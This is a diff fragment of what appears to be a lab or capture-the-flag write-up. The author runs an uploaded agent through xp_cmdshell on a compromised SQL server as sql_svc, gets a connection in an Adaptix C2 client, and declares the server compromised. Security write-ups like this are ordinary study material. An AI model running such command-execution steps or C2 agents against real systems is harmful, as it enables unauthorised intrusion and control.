@@ -70,4 +70,11 @@ This uploaded the agent to the target
 ```python
 SQL (sql_svc  dbo@master)> xp_cmdshell C:\Users\Public\sql-agent.x64.exe
 ```
-This executed the agent so now if i look back at adaptix clie
+This executed the agent so now if i look back at adaptix client ive got a connection
+
+![](Pasted%20image%2020260419154739.png)
+
+![](Pasted%20image%2020260419154806.png)
+
+The SQL server is now compromised
+
